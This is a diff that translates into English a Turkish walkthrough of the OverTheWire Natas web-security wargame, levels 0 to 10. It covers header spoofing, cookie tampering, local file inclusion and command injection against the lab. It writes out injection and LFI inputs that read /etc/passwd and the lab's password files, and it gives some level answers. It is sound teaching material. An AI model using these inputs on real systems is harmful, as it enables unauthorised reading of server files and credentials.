@@ -1,263 +1,264 @@
-# 🌐 OverTheWire: Natas — Level 0'dan Level 10'a Türkçe Rehber
+# 🌐 OverTheWire: Natas — Level 0 to Level 10 English Guide
 
-> Natas tamamen **web güvenliği** üzerine kurulu. SSH yok — her level kendi web sitesi.  
-> HTML'den PHP'ye, cookie manipülasyonundan komut enjeksiyonuna kadar web'in temel açıklarını öğreniyorsun.
+> Natas is entirely about **web security**. No SSH — each level has its own website.  
+> You'll learn the fundamental web vulnerabilities, from HTML to PHP,  
+> from cookie manipulation to command injection.
 
-**URL formatı:** `http://natasX.natas.labs.overthewire.org` (X = level numarası)  
-**Başlangıç:** kullanıcı `natas0`, şifre `natas0`  
-**Referans:** [mayadevbe.me](https://mayadevbe.me/tags/natas/) (0-6) · [learnhacking.io](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/) (7-10)
+**URL format:** `http://natasX.natas.labs.overthewire.org` (X = level number)  
+**Start:** user `natas0`, password `natas0`  
+**Reference:** [mayadevbe.me](https://mayadevbe.me/tags/natas/) (0-6) · [learnhacking.io](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/) (7-10)
 
 ---
 
-## 🗺️ Genel Bakış
+## 🗺️ Overview
 
-| Level | Konu | Teknik |
+| Level | Topic | Technique |
 |---|---|---|
-| 0 → 1 | HTML kaynak kodu | DevTools / View Source |
-| 1 → 2 | Sağ tık engeli | DevTools kısayolu |
-| 2 → 3 | Erişilebilir klasörler | Directory listing |
-| 3 → 4 | robots.txt | Web crawler bilgisi |
-| 4 → 5 | HTTP Referer header | curl / header manipülasyonu |
-| 5 → 6 | Cookie manipülasyonu | DevTools Storage |
-| 6 → 7 | PHP kaynak kodu | include dosyası okuma |
-| 7 → 8 | LFI (Local File Inclusion) | URL parametresi manipülasyonu |
-| 8 → 9 | PHP kod tersine çevirme | CyberChef / base64+hex |
-| 9 → 10 | Komut enjeksiyonu | passthru() açığı |
-| 10 → 11 | Filtreli komut enjeksiyonu | grep çoklu dosya |
+| 0 → 1 | HTML source code | DevTools / View Source |
+| 1 → 2 | Right-click block | DevTools shortcut |
+| 2 → 3 | Accessible directories | Directory listing |
+| 3 → 4 | robots.txt | Web crawler knowledge |
+| 4 → 5 | HTTP Referer header | curl / header manipulation |
+| 5 → 6 | Cookie manipulation | DevTools Storage |
+| 6 → 7 | PHP source code | Reading include file |
+| 7 → 8 | LFI (Local File Inclusion) | URL parameter manipulation |
+| 8 → 9 | PHP code reverse engineering | CyberChef / base64+hex |
+| 9 → 10 | Command injection | passthru() vulnerability |
+| 10 → 11 | Filtered command injection | grep multiple files |
 
-**Faydalı araçlar:**
-- [CyberChef](https://gchq.github.io/CyberChef/) — Encoding/decoding işlemleri
-- [Burp Suite](https://portswigger.net/burp) — HTTP proxy / request manipülasyonu
-- `curl` — Komut satırından HTTP isteği
-- Tarayıcı DevTools (F12) — Kaynak kodu, cookie, network
+**Useful tools:**
+- [CyberChef](https://gchq.github.io/CyberChef/) — Encoding/decoding operations
+- [Burp Suite](https://portswigger.net/burp) — HTTP proxy / request manipulation
+- `curl` — HTTP requests from the command line
+- Browser DevTools (F12) — Source code, cookies, network
 
 ---
 
-## Level 0 — HTML Kaynak Kodunu Oku
+## Level 0 — Read the HTML Source Code
 
-### 🔐 Giriş
+### 🔐 Login
 ```
 URL:      http://natas0.natas.labs.overthewire.org
-Kullanıcı: natas0
-Şifre:    natas0
+User:     natas0
+Password: natas0
 ```
 
-### 🎯 Görev
-Şifre sayfanın bir yerinde gizli.
+### 🎯 Task
+The password is hidden somewhere on the page.
 
-### 📖 Teori: HTML ve Yorum Etiketi
+### 📖 Theory: HTML and Comment Tags
 
-**HTML (HyperText Markup Language):** Her web sitesinin iskeletidir. Tarayıcı HTML'i işleyip görsel çıktıya dönüştürür. Kullanıcı sayfada görmese de kaynak kodu her zaman okunabilir.
+**HTML (HyperText Markup Language):** The skeleton of every website. The browser processes HTML and turns it into visual output. Even if the user doesn't see it, the source code is always readable.
 
-**HTML yorum etiketi:** `<!-- bu kısım tarayıcıda görünmez -->` — Geliştiriciler not almak için kullanır ama hassas bilgi bırakmak tehlikelidir!
+**HTML comment tag:** `<!-- this part is not visible in the browser -->` — Developers use it for notes, but leaving sensitive information there is dangerous!
 
-Kaynak kodu görmek için:
+To view source code:
 - `F12` → DevTools → Elements / Inspector
-- Sağ tık → "View Page Source"
+- Right-click → "View Page Source"
 - `Ctrl+U` (Chrome/Firefox)
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-F12 → Elements sekmesi → HTML içinde arama yap
-<!-- The password for natas1 is <ŞİFRE> -->
+F12 → Elements tab → Search inside HTML
+<!-- The password for natas1 is <PASSWORD> -->
 ```
 
 ---
 
-## Level 1 → Level 2 — Sağ Tık Engeli
+## Level 1 → Level 2 — Right-Click Block
 
-### 🎯 Görev
-Sağ tık devre dışı bırakılmış. Yine de kaynak kodu bul.
+### 🎯 Task
+Right-click has been disabled. Find the source code anyway.
 
-### 📖 Teori
-JavaScript ile sağ tık engellenebilir ama DevTools her zaman açılabilir.
+### 📖 Theory
+Right-click can be blocked with JavaScript, but DevTools can always be opened.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-F12 tuşuna bas → DevTools açılır (sağ tıka gerek yok)
-Elements sekmesinde → HTML yorumunda şifre
+Press F12 → DevTools opens (no right-click needed)
+In the Elements tab → password in HTML comment
 ```
 
-> 💡 **Ders:** Client-side (tarayıcı tarafı) güvenlik önlemleri her zaman atlatılabilir. Güvenliği asla tarayıcıya bırakma.
+> 💡 **Lesson:** Client-side (browser-side) security measures can always be bypassed. Never leave security up to the browser.
 
 ---
 
-## Level 2 → Level 3 — Erişilebilir Klasörler
+## Level 2 → Level 3 — Accessible Directories
 
-### 🎯 Görev
-"Bu sayfada hiçbir şey yok" diyor. Başka bir yere bak.
+### 🎯 Task
+It says "There is nothing on this page". Look somewhere else.
 
-### 📖 Teori: Web Sunucu Dizin Yapısı
+### 📖 Theory: Web Server Directory Structure
 
-Web sunucusu dosyalar barındırır. URL'deki yol, sunucudaki dosya konumunu gösterir:
+A web server hosts files. The path in the URL shows the file location on the server:
 ```
 http://site.com/files/image.png
-→ sunucuda /files/image.png konumunda
+→ located at /files/image.png on the server
 ```
 
-Eğer sunucu klasör listelemeye (directory listing) izin veriyorsa:
+If the server allows directory listing:
 ```
 http://site.com/files/
-→ klasördeki tüm dosyaları listeler!
+→ lists all files in the directory!
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-1. F12 → Kaynak kodda img etiketi gör:
+1. F12 → See img tag in source code:
    <img src="files/pixel.png">
 
-2. URL'ye git:
+2. Navigate to URL:
    http://natas2.natas.labs.overthewire.org/files/
 
-3. Klasör açık → users.txt görünür
+3. Directory is open → users.txt visible
 
 4. http://natas2.natas.labs.overthewire.org/files/users.txt
-   → içinde natas3'ün şifresi
+   → contains natas3's password
 ```
 
-> 💡 **Ders:** Web sunucularında directory listing kapalı olmalıdır. Açık bırakılırsa saldırganlar tüm dosyaları görebilir.
+> 💡 **Lesson:** Directory listing should be disabled on web servers. If left open, attackers can see all files.
 
 ---
 
 ## Level 3 → Level 4 — robots.txt
 
-### 🎯 Görev
-Kaynak kodda ipucu: "Google bile bulamayacak". Ne demek istiyor?
+### 🎯 Task
+Hint in source code: "Not even Google will find it". What does that mean?
 
-### 📖 Teori: robots.txt
+### 📖 Theory: robots.txt
 
-**robots.txt:** Web tarayıcılarına (Google, Bing vb.) hangi sayfaların indexlenip indexlenmeyeceğini söyleyen dosya. Her sitede `http://site.com/robots.txt` konumunda olabilir.
+**robots.txt:** A file that tells web crawlers (Google, Bing, etc.) which pages should or shouldn't be indexed. Can be found at `http://site.com/robots.txt` on any site.
 
 ```
 User-agent: *
-Disallow: /gizli-klasor/
+Disallow: /secret-folder/
 ```
 
-**ÖNEMLİ:** robots.txt bir güvenlik önlemi DEĞİLDİR! Disallow yazılan sayfalar hâlâ erişilebilir — sadece arama motorlarına "indexleme" deniyor.
+**IMPORTANT:** robots.txt is NOT a security measure! Pages listed as Disallow are still accessible — it just tells search engines "don't index".
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-1. robots.txt'e git:
+1. Go to robots.txt:
    http://natas3.natas.labs.overthewire.org/robots.txt
 
-2. Disallow edilen klasörü bul (örn. /s3cr3t/)
+2. Find the disallowed directory (e.g. /s3cr3t/)
 
-3. O klasöre git:
+3. Navigate to that directory:
    http://natas3.natas.labs.overthewire.org/s3cr3t/
 
-4. users.txt → şifre
+4. users.txt → password
 ```
 
 ---
 
-## Level 4 → Level 5 — HTTP Referer Header Manipülasyonu
+## Level 4 → Level 5 — HTTP Referer Header Manipulation
 
-### 🎯 Görev
-"natas5'ten gelmen gerekiyor" diyor ama sen natas4'tesin. Referer header'ı değiştir.
+### 🎯 Task
+It says "you must come from natas5" but you're on natas4. Change the Referer header.
 
-### 📖 Teori: HTTP Request Headers
+### 📖 Theory: HTTP Request Headers
 
-Tarayıcı her istekte çeşitli bilgiler gönderir — **HTTP header'ları**. Önemli olanlar:
+The browser sends various information with each request — **HTTP headers**. Important ones:
 
-- `Referer` → isteğin hangi sayfadan geldiği
-- `Authorization` → kimlik bilgisi (base64 encoded)
-- `Cookie` → oturum bilgisi
-- `User-Agent` → tarayıcı bilgisi
+- `Referer` → which page the request came from
+- `Authorization` → credentials (base64 encoded)
+- `Cookie` → session information
+- `User-Agent` → browser information
 
-Bu header'lar manipüle edilebilir!
+These headers can be manipulated!
 
 ```bash
 curl "http://natas4.natas.labs.overthewire.org/" \
   -H "Referer: http://natas5.natas.labs.overthewire.org/" \
-  -u natas4:<şifre>
+  -u natas4:<password>
 ```
 
-### 🔧 Çözüm — curl ile
+### 🔧 Solution — with curl
 
 ```bash
-# F12 → Network → isteğe sağ tık → "Copy as cURL"
-# Kopyalanan komutu düzenle: Referer'daki 4'ü 5 yap
+# F12 → Network → right-click on request → "Copy as cURL"
+# Edit the copied command: change 4 to 5 in Referer
 
 curl "http://natas4.natas.labs.overthewire.org/" \
   -H "Referer: http://natas5.natas.labs.overthewire.org/" \
-  -H "Authorization: Basic <base64_kimlik>"
+  -H "Authorization: Basic <base64_credentials>"
 ```
 
-### 🔧 Alternatif — Firefox DevTools
+### 🔧 Alternative — Firefox DevTools
 
 ```
-F12 → Network → isteğe sağ tık → "Edit and Resend"
-Referer header'ını natas5 URL'siyle değiştir → Gönder
-Response → Raw → şifre
+F12 → Network → right-click on request → "Edit and Resend"
+Replace Referer header with natas5 URL → Send
+Response → Raw → password
 ```
 
 ---
 
-## Level 5 → Level 6 — Cookie Manipülasyonu
+## Level 5 → Level 6 — Cookie Manipulation
 
-### 🎯 Görev
-"Giriş yapmadınız" diyor. Cookie'ye bak.
+### 🎯 Task
+It says "You are not logged in". Check the cookie.
 
-### 📖 Teori: HTTP Cookie
+### 📖 Theory: HTTP Cookie
 
-**Cookie:** HTTP stateless (durumsuz) bir protokol — sunucu oturumları hatırlamaz. Cookie'ler tarayıcıda saklanır ve her istekte sunucuya gönderilir. Oturum bilgisi, tercihleri vb. tutar.
+**Cookie:** HTTP is a stateless protocol — the server doesn't remember sessions. Cookies are stored in the browser and sent to the server with each request. They store session information, preferences, etc.
 
-Önemli: Cookie'ler **client-side** saklandığından kullanıcı tarafından değiştirilebilir! Bu büyük bir güvenlik açığıdır.
-
-```
-F12 → Storage/Application sekmesi → Cookies → değerleri görebilir ve değiştirebilirsin
-```
-
-### 🔧 Çözüm
+Important: Cookies are stored **client-side**, so the user can modify them! This is a major security vulnerability.
 
 ```
-1. http://natas5.natas.labs.overthewire.org/ gir
-2. F12 → Storage → Cookies → natas5 sitesi
-3. "loggedin" cookie'sini bul → değer: 0
-4. Çift tıkla → 1 yap → sayfayı yenile
-5. Erişim verildi → şifre görünür
+F12 → Storage/Application tab → Cookies → can view and change values
 ```
 
-> 💡 **Ders:** Güvenlik kontrolleri asla client-side cookie'ye bırakılmamalı. Sunucu tarafında doğrulama şart.
+### 🔧 Solution
+
+```
+1. Go to http://natas5.natas.labs.overthewire.org/
+2. F12 → Storage → Cookies → natas5 site
+3. Find the "loggedin" cookie → value: 0
+4. Double-click → change to 1 → refresh the page
+5. Access granted → password appears
+```
+
+> 💡 **Lesson:** Security checks should never rely on client-side cookies. Server-side verification is mandatory.
 
 ---
 
-## Level 6 → Level 7 — PHP Kaynak Kodu ve Include Dosyası
+## Level 6 → Level 7 — PHP Source Code and Include File
 
-### 🎯 Görev
-Gizli bir değer isteniyor. PHP kaynak kodunu incele.
+### 🎯 Task
+A secret value is required. Inspect the PHP source code.
 
-### 📖 Teori: PHP ve Include
+### 📖 Theory: PHP and Include
 
-**PHP:** Sunucu tarafında çalışan script dili. Tarayıcı PHP kodu görmez — sadece çıktısını görür. Ama bazen kaynak kodu erişilebilir bırakılır.
+**PHP:** A scripting language that runs on the server side. The browser doesn't see PHP code — it only sees the output. But sometimes source code is left accessible.
 
-`include "dosya.inc"` → başka dosyadan kod/değişken ekler. Bu dosya gizli tutulmazsa, direkt URL ile erişilebilir.
+`include "file.inc"` → adds code/variables from another file. If this file isn't kept secret, it can be accessed directly via URL.
 
-PHP değişkenler `$` ile başlar:
+PHP variables start with `$`:
 ```php
-$secret = "gizliDeger";
+$secret = "secretValue";
 if($_POST['secret'] == $secret) { ... }
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-1. "View sourcecode" linkine tıkla → PHP kodu gör
-2. include "includes/secret.inc" satırını bul
-3. Direkt git:
+1. Click the "View sourcecode" link → see PHP code
+2. Find the line: include "includes/secret.inc"
+3. Navigate directly:
    http://natas6.natas.labs.overthewire.org/includes/secret.inc
-4. Sayfa boş görünür ama kaynak kodda $secret değerini bul
-5. O değeri forma gir → erişim verildi
+4. Page appears blank but find $secret value in source code
+5. Enter that value in the form → access granted
 ```
 
-**curl ile:**
+**With curl:**
 ```bash
 curl 'http://natas6.natas.labs.overthewire.org/' \
-  -u natas6:<şifre> \
+  -u natas6:<password> \
   --data-raw 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
 ```
 
@@ -265,44 +266,44 @@ curl 'http://natas6.natas.labs.overthewire.org/' \
 
 ## Level 7 → Level 8 — LFI (Local File Inclusion)
 
-### 🎯 Görev
-URL'de `?page=home` parametresi var. Bu parametre ile sunucudaki herhangi bir dosyayı okutabilirsin.
+### 🎯 Task
+There's a `?page=home` parameter in the URL. You can use this parameter to read any file on the server.
 
-### 📖 Teori: Local File Inclusion (LFI)
+### 📖 Theory: Local File Inclusion (LFI)
 
-**LFI:** Sunucu, kullanıcı girdisini doğrulamadan dosya yolu olarak kullandığında ortaya çıkan açık. Saldırgan sunucudaki herhangi bir dosyayı okuyabilir.
+**LFI:** A vulnerability that occurs when a server uses user input as a file path without validation. An attacker can read any file on the server.
 
-Kaynak kodda hint var: şifre `/etc/natas_webpass/natas8` konumunda.
+There's a hint in the source code: the password is located at `/etc/natas_webpass/natas8`.
 
 ```
 http://site.com/index.php?page=home
-→ sunucu "home" dosyasını yükler
+→ server loads the "home" file
 
 http://site.com/index.php?page=/etc/passwd
-→ sunucu /etc/passwd dosyasını yükler!
+→ server loads /etc/passwd!
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-URL'yi değiştir:
+Change the URL:
 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 
-→ Sayfada natas8'in şifresi görünür
+→ natas8's password appears on the page
 ```
 
-> 💡 **Ders:** Kullanıcı girdisi asla doğrudan dosya yolu olarak kullanılmamalı. Input validation şart.
+> 💡 **Lesson:** User input should never be used directly as a file path. Input validation is mandatory.
 
 ---
 
-## Level 8 → Level 9 — PHP Kod Tersine Çevirme
+## Level 8 → Level 9 — PHP Code Reverse Engineering
 
-### 🎯 Görev
-Şifre encode edilmiş. Encode fonksiyonunu tersine çevir, orijinal şifreyi bul.
+### 🎯 Task
+The password is encoded. Reverse the encoding function to find the original password.
 
-### 📖 Teori: Encode Zincirini Tersine Çevirmek
+### 📖 Theory: Reversing an Encoding Chain
 
-PHP kaynak kodu:
+PHP source code:
 ```php
 $encodedSecret = "3d3d516343746d4d6d6c315669563362";
 
@@ -311,72 +312,72 @@ function encodeSecret($secret) {
 }
 ```
 
-Şifreleme sırası: `düz metin → base64 → ters çevir → hex`
+Encoding order: `plaintext → base64 → reverse → hex`
 
-Çözme sırası tersine: `hex → ters çevir → base64 decode → düz metin`
+Decoding order is reversed: `hex → reverse → base64 decode → plaintext`
 
-### 🔧 Çözüm — CyberChef ile
+### 🔧 Solution — with CyberChef
 
-1. [CyberChef](https://gchq.github.io/CyberChef/) aç
-2. "From Hex" işlemi ekle → `3d3d516343746d4d6d6c315669563362` gir
-3. "Reverse" işlemi ekle
-4. "From Base64" işlemi ekle
-5. Sonuç: `oubWYf2kBq`
+1. Open [CyberChef](https://gchq.github.io/CyberChef/)
+2. Add "From Hex" operation → enter `3d3d516343746d4d6d6c315669563362`
+3. Add "Reverse" operation
+4. Add "From Base64" operation
+5. Result: `oubWYf2kBq`
 
-**Komut satırı ile:**
+**From the command line:**
 ```bash
 echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
 ```
 
-O değeri forma gir → şifre verilir.
+Enter that value in the form → password is given.
 
 ---
 
-## Level 9 → Level 10 — Komut Enjeksiyonu (Command Injection)
+## Level 9 → Level 10 — Command Injection
 
-### 🎯 Görev
-Arama kutusu var, PHP `grep` komutu çalıştırıyor. Kendi komutunu enjekte et.
+### 🎯 Task
+There's a search box, PHP is running a `grep` command. Inject your own command.
 
-### 📖 Teori: Command Injection
+### 📖 Theory: Command Injection
 
-PHP kaynak kodu:
+PHP source code:
 ```php
 passthru("grep -i $key dictionary.txt");
 ```
 
-`passthru()` → sistem komutunu çalıştırır ve çıktısını direkt gösterir. `$key` kullanıcı girdisi — hiç filtrelenmemiş!
+`passthru()` → runs a system command and outputs the result directly. `$key` is user input — completely unfiltered!
 
-Linux'ta `;` ile birden fazla komut zincirlenebilir:
+In Linux, `;` can chain multiple commands:
 ```bash
 grep -i test dictionary.txt ; ls -la ; cat /etc/passwd
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
-Arama kutusuna yaz:
+Type in the search box:
 ```
 ; cat /etc/natas_webpass/natas10;
 ```
 
-Bu çalıştırılacak komut:
+The command that will be executed:
 ```bash
 grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt
 ```
 
-→ Şifre sayfada görünür!
+→ Password appears on the page!
 
-> 💡 **Ders:** Kullanıcı girdisi asla direkt komuta dahil edilmemeli. `escapeshellarg()` veya whitelist kullan.
+> 💡 **Lesson:** User input should never be included directly in a command. Use `escapeshellarg()` or a whitelist.
 
 ---
 
-## Level 10 → Level 11 — Filtreli Komut Enjeksiyonu
+## Level 10 → Level 11 — Filtered Command Injection
 
-### 🎯 Görev
-Artık `;`, `|`, `&` karakterleri filtreleniyor. Farklı bir yöntem bul.
+### 🎯 Task
+Now `;`, `|`, `&` characters are filtered. Find a different method.
 
-### 📖 Teori: Filtreyi Atlatmak
+### 📖 Theory: Bypassing the Filter
 
-PHP kodu:
+PHP code:
 ```php
 if(preg_match('/[;|&]/', $key)) {
     print "Input contains an illegal character!";
@@ -385,71 +386,71 @@ if(preg_match('/[;|&]/', $key)) {
 }
 ```
 
-`;`, `|`, `&` yok ama boşluk serbest! `grep` birden fazla dosyada arama yapabilir:
+No `;`, `|`, `&` but space is free! `grep` can search in multiple files:
 ```bash
-grep -i PATTERN dosya1 dosya2
+grep -i PATTERN file1 file2
 ```
 
-Bunu kullanarak şifre dosyasını direkt arama kapsamına alabiliriz.
+We can use this to include the password file directly in the search scope.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
-Arama kutusuna yaz:
+Type in the search box:
 ```
 .* /etc/natas_webpass/natas10
 ```
 
-Bu çalıştırılacak komut:
+The command that will be executed:
 ```bash
 grep -i .* /etc/natas_webpass/natas10 dictionary.txt
 ```
 
-`.*` tüm satırlarla eşleşir → şifre dosyasının tüm içeriği çıkar!
+`.*` matches all lines → entire contents of the password file are output!
 
-> 💡 **Ders:** Blacklist (yasaklı karakter listesi) yetersizdir. Whitelist (izinli karakter listesi) kullan.
-
----
-
-## 📚 Öğrenilen Web Güvenliği Kavramları
-
-| Kavram | Açıklama |
-|---|---|
-| **View Source** | HTML kaynak kodunu görme |
-| **HTML Comment** | `<!-- -->` içindeki gizli bilgiler |
-| **Directory Listing** | Klasör içeriğinin görünür olması |
-| **robots.txt** | Crawler yönlendirmesi — güvenlik değil! |
-| **HTTP Headers** | Referer, Cookie, Authorization vb. |
-| **Cookie Manipülasyonu** | Client-side değerleri değiştirme |
-| **PHP Include** | Dışarıdan kod ekleme — gizli dosya riski |
-| **LFI** | Local File Inclusion — dosya yolu enjeksiyonu |
-| **Kod Tersine Çevirme** | Encode zincirini geri çözme |
-| **Command Injection** | Kullanıcı girdisiyle sistem komutu çalıştırma |
-| **Filtre Atlatma** | Blacklist yetersizliğini kullanma |
-
-## 📚 Kullanılan Araçlar
-
-| Araç | Ne için |
-|---|---|
-| `F12` (DevTools) | Kaynak kodu, cookie, network |
-| `curl` | Komut satırından HTTP isteği |
-| [CyberChef](https://gchq.github.io/CyberChef/) | Encoding/decoding zincirleri |
-| `Ctrl+U` | Hızlı kaynak kodu görüntüleme |
+> 💡 **Lesson:** Blacklisting (banned character list) is insufficient. Use whitelisting (allowed character list).
 
 ---
 
-## 🔗 Faydalı Kaynaklar
+## 📚 Web Security Concepts Learned
+
+| Concept | Description |
+|---|---|
+| **View Source** | Viewing HTML source code |
+| **HTML Comment** | Hidden information inside `<!-- -->` |
+| **Directory Listing** | Directory contents being visible |
+| **robots.txt** | Crawler guidance — not security! |
+| **HTTP Headers** | Referer, Cookie, Authorization, etc. |
+| **Cookie Manipulation** | Changing client-side values |
+| **PHP Include** | Adding code from external files — risk of hidden files |
+| **LFI** | Local File Inclusion — file path injection |
+| **Code Reverse Engineering** | Reversing an encoding chain |
+| **Command Injection** | Running system commands via user input |
+| **Filter Bypass** | Exploiting blacklist deficiencies |
+
+## 📚 Tools Used
+
+| Tool | Purpose |
+|---|---|
+| `F12` (DevTools) | Source code, cookies, network |
+| `curl` | HTTP requests from command line |
+| [CyberChef](https://gchq.github.io/CyberChef/) | Encoding/decoding chains |
+| `Ctrl+U` | Quick source code viewing |
+
+---
+
+## 🔗 Useful Resources
 
 - [OverTheWire Natas](https://overthewire.org/wargames/natas/)
 - [MayADevBe Natas Walkthrough](https://mayadevbe.me/tags/natas/) (Level 0-6)
 - [LearnHacking.io Natas 6-10](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/)
-- [W3Schools HTML](https://www.w3schools.com/html/) — HTML temelleri
-- [W3Schools PHP](https://www.w3schools.com/php/) — PHP temelleri
-- [MDN HTTP Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview) — HTTP protokolü
-- [CyberChef](https://gchq.github.io/CyberChef/) — Her türlü encode/decode
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — En yaygın web açıkları
+- [W3Schools HTML](https://www.w3schools.com/html/) — HTML basics
+- [W3Schools PHP](https://www.w3schools.com/php/) — PHP basics
+- [MDN HTTP Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview) — HTTP protocol
+- [CyberChef](https://gchq.github.io/CyberChef/) — All kinds of encode/decode
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Most common web vulnerabilities
 
 ---
 
-**Sonraki bölüm:** [natas_11-20.md](./natas_11-20.md)
+**Next section:** [natas_11-20.md](./natas_11-20.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
